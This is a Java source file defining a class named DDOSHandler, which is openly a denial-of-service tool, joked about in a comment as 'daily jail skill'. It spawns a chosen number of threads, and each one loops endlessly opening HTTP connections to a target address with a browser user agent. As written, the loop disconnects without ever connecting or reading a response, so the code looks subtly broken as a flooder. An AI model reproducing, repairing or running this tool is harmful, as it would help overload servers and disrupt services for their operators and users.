package io.flybird.util;

import io.flybird.util.logging.LogHandler;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

//daily jail skill :D
public class DDOSHandler {
    public static void start(String addr, int threads) {
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        for (int i = 0; i < threads; i++) {
            int finalI = i;

            executorService.submit(new Runnable() {
                LogHandler handler = LogHandler.create("DDOSHandler/Thread" + finalI);
                private static final String USER_AGENT = "Mozilla/5.0";

                @Override
                public void run() {
                    try {
                        handler.info("starting thread:" + finalI);
                        while (true) {
                            HttpURLConnection con = null;
                            try {
                                con = (HttpURLConnection) new URL(addr).openConnection();
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }

                            try {
                                con.setRequestMethod("GET");
                            } catch (ProtocolException e) {
                                throw new RuntimeException(e);
                            }
                            con.setRequestProperty("User-Agent", USER_AGENT);
                            con.disconnect();
                        }
                    } catch (RuntimeException e) {
                        handler.exception(e);
                    }
                    handler.info("thread " + finalI + " stopped");
                }
            });
        }
    }
}
